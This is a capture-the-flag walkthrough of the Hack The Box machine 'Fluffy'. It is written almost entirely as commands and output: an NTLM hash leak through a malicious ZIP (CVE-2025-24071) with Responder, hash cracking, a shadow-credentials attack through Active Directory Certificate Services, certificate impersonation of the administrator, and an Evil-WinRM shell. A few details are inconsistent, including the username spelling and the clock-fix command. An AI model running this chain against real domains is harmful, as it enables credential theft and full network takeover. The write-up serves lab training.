---
author: Amal PK
pubDatetime: 2026-05-08T06:31:18.318Z
title: "Hackthebox Fluffy Walkthrough — Windows Seasonal Box"
featured: true
draft: false
tags:
  - "hackthebox"
  - "windows"
  - "active directory"
  - "bloodhound"
  - "privilege escalation"
  - "pentesting"
description: "Fluffy HTB walkthrough: enumerate SMB shares, capture NTLM creds via File Explorer, map BloodHound paths, abuse ADCS shadow credentials, and escalate to DA."
collection: hack-the-box/windows
ogImage: "/images/posts/hackthebox-fluffy-walkthrough-windows-seasonal-box/image-1.webp"
---

![Hack The Box Fluffy Windows machine write-up cover image](/images/posts/hackthebox-fluffy-walkthrough-windows-seasonal-box/image-1.webp)


> **Fluffy** is a realistic Windows Active Directory (AD) machine on Hack The Box's Seasonal track that simulates a corporate environment with common misconfigurations and vulnerabilities often seen in real-world internal networks. The box begins with valid user credentials, requiring enumeration of SMB shares to discover internal documentation referencing unpatched CVEs. From there, attackers exploit a **File Explorer spoofing vulnerability** to capture NTLM hashes, perform **BloodHound-based enumeration**, abuse **Active Directory Certificate Services (ADCS)** via **shadow credentials**, and escalate to **domain administrator** through **certificate impersonation**. Fluffy is an excellent box for understanding modern AD escalation techniques and certificate abuse.

```xml
 As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
```

%%[buymeacoffee]

## Enumerate SMB Shares

```xml
smbclient -L //10.129.248.64 -U j.fleischman                                                         1 ✘  04:41:44

Password for [WORKGROUP\j.fleischman]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
```

### We connect to the `IT` share:

```xml
smbclient //10.129.247.167/IT -U j.fleischman

Password for [WORKGROUP\j.fleischman]:

Try "help" to get a list of possible commands.
smb: \>
smb: \> ls
  .                                   D        0  Mon May 19 19:57:02 2025
  ..                                  D        0  Mon May 19 19:57:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 20:38:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 20:34:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 20:38:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 20:33:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 20:01:07 2025

		5842943 blocks of size 4096. 1614198 blocks available
```

### Download the contents of the files.

```xml
smb: \> get Everything-1.4.1.1026.x64.zip
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (176.9 KiloBytes/sec) (average 176.9 KiloBytes/sec)

smb: \> get Upgrade_Notice.pdf
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (79.9 KiloBytes/sec) (average 79.9 KiloBytes/sec)
```

### Analyze `Upgrade_Notice.pdf`

![SMB directory listing containing Everything, KeePass, and Upgrade Notice files](/images/posts/hackthebox-fluffy-walkthrough-windows-seasonal-box/image-2.png)

Opening it revealed an internal upgrade notice sent to the IT department, outlining several newly disclosed vulnerabilities.

![Upgrade notice listing CVEs discovered in the Fluffy machine scenario](/images/posts/hackthebox-fluffy-walkthrough-windows-seasonal-box/image-3.png)

**Highlighted CVEs:**

- **CVE-2025-24996** – _Critical_

- **CVE-2025-24071** – _Critical_

- **CVE-2025-46785** – _High_

- **CVE-2025-29968** – _High_

- **CVE-2025-21193** – _Medium_

- **CVE-2025-3445** – _Low_

Among these, **CVE-2025-24071** was a **Windows File Explorer spoofing vulnerability**. It's critical and has known public exploits that leak NTLM hashes through `.library-ms` and crafted ZIP files.

> NSFOCUS CERT has detected that Microsoft recently released a security update to address a critical spoofing vulnerability in Windows File Explorer, identified as **CVE-2025-24071**. This vulnerability has a CVSS score of 7.5, indicating its severity. The issue arises from the implicit trust and automatic file parsing behavior of `.library-ms` files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash. PoC (Proof of Concept) exploits for this vulnerability are now publicly available, making it a current threat. Affected users are strongly advised to apply the patch immediately to mitigate the risk.

**Exploit Link**: [https://github.com/ThemeHackers/CVE-2025-24071](https://github.com/ThemeHackers/CVE-2025-24071)

### Exploit CVE-2025-24071

Use the PoC exploit from the GitHub repository:

```xml
python exploit.py -f evil -i <your_ip>
```

### Share the malicious file via SMB:

Copy the file back to the `IT` share using `smbclient` or mount the share locally.

```xml
smbclient //10.129.248.64/IT -U j.fleischman%J0elTHEM4n1990! -c "put exploit.zip"
```

Meanwhile, **run Responder**:

```xml
sudo responder -I tun0

p.agila::FLUFFY:8ae28cc494fbb7b5:05E2A75D8D4029FD5337C69EDE0831B1:010100000000000000BC2AAF9BCDDB011B9B76581C80F5150000000002000800330044005100490001001E00570049004E002D003100490054004F0035004E004B00570051003800590004003400570049004E002D003100490054004F0035004E004B0057005100380059002E0033004400510049002E004C004F00430041004C000300140033004400510049002E004C004F00430041004C000500140033004400510049002E004C004F00430041004C000700080000BC2AAF9BCDDB010600040002000000080030003000000000000000010000000020000078C646BD86882A7ED73DAD1B7D3124E1186418F1AA07B3351869C1591AE2D49B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390034000000000000000000
```

### NTLM Hash Captured!

You’ll catch the hash of another user — let's say `p.agilia`.

Lets crack the hash using hashcat.

```xml
hashcat -m 5600 NTLM_p_agila.hash /usr/share/wordlists/rockyou.txt

P.AGILA::FLUFFY:8ae28cc494fbb7b5:05e2a75d8d4029fd5337c69ede0831b1:010100000000000000bc2aaf9bcddb011b9b76581c80f5150000000002000800330044005100490001001e00570049004e002d003100490054004f0035004e004b00570051003800590004003400570049004e002d003100490054004f0035004e004b0057005100380059002e0033004400510049002e004c004f00430041004c000300140033004400510049002e004c004f00430041004c000500140033004400510049002e004c004f00430041004c000700080000bc2aaf9bcddb010600040002000000080030003000000000000000010000000020000078c646bd86882a7ed73dad1b7d3124e1186418f1aa07b3351869c1591ae2d49b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390034000000000000000000:prometheusx-303
```

### Enumeration

Now that we have creds for `p.agilia`, let’s enumerate the domain:

### Key Findings:

`P.AGILIA` is a member of the **Service Accounts Managers** group.  
This group has **GenericAll** rights on:

- `Service Accounts@fluffy.htb` group → which has control over:

  - `CA_SVC`

  - `LDAP_SVC`

  - `WINRMSVC`

### Add `p.agilia` to `Service Accounts` Group

We use **BloodyAD** to escalate group membership.

```xml
python bloodyAD.py --host 10.129.248.64 -d fluffy.htb -u p.agilia -p 'prometheusx-303' add groupMember 'Service Accounts' p.agilia

[+] p.agila added to Service Accounts
```

### Shadow Credentials Attack with Certipy

Use **Certipy** to abuse shadow credentials:

```xml
certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account ca_svc

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd02938f8-31da-467b-023d-cd1780164857'
[*] Adding Key Credential with device ID 'd02938f8-31da-467b-023d-cd1780164857' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'd02938f8-31da-467b-023d-cd1780164857' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

This will create a key credential and inject it into `ca_svc`, then get a TGT and extract the NT hash.

Extracted hash:

```xml
NT Hash for ca_svc: ca0f4f9e9eb8a092addf53bb03fc98c8
```

### Abuse UPN for Administrator Impersonation

Let’s change the `UserPrincipalName` of `ca_svc` to `administrator@fluffy.htb`:

```xml
certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.248.64 -upn 'administrator@fluffy.htb' -user 'ca_svc' update

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator@fluffy.htb
[*] Successfully updated 'ca_svc'
```

### Request Certificate for Administrator

Now we request a certificate with UPN set to Administrator:

```xml
certipy-ad req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.248.64 -target 10.129.248.64 -ca 'fluffy-DC01-CA' -template 'User'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

This gives you `administrator.pfx`

### Authenticate as Administrator

```xml
certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.129.248.64
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fluffy.htb'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

You will obtain TGT and NT hash:

```xml
aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

## WinRM as Administrator

Finally, drop into a shell using **Evil-WinRM**:

```xml
evil-winrm -i 10.129.248.64 -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
```

### Summary of Attack Path:

1.  Enumerated SMB share and found a PoC for CVE-2025-24071.

2.  Exploited CVE to capture NTLM hash via Responder.

3.  Used `p.agilia` creds to enumerate BloodHound data.

4.  Abused Service Account Manager privilege to escalate access.

5.  Performed Shadow Credentials attack on `ca_svc`.

6.  Changed UPN to `administrator@fluffy.htb`.

7.  Requested and authenticated with a certificate as Administrator.

8.  Gained full access via Evil-WinRM.

> 📝 **Note**  
> Sometimes during Kerberos authentication, you might encounter the following error:

```xml
vbnetCopyEdit[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)
```

This happens when there's a time mismatch between your attacking machine and the target. Kerberos is very sensitive to time differences.

### To fix it, run:

```xml
timedatectl set-ntp off
rdate -n <your-ip>
```

This disables automatic time sync and manually sets your system time to match the target, resolving the clock skew issue.
